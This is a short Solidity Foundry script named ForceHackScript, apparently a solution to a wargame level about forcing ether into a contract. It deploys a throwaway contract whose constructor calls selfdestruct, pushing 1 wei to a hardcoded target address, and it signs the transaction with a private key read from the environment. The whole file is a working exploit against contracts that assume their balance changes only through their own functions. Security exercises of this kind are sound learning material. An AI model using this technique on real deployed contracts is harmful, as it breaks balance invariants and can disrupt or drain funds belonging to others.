// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0xb56FdDd5AbE00A51D88fDaB7D9F68Bf3F3b9f332));
        vm.stopBroadcast();
    }
}
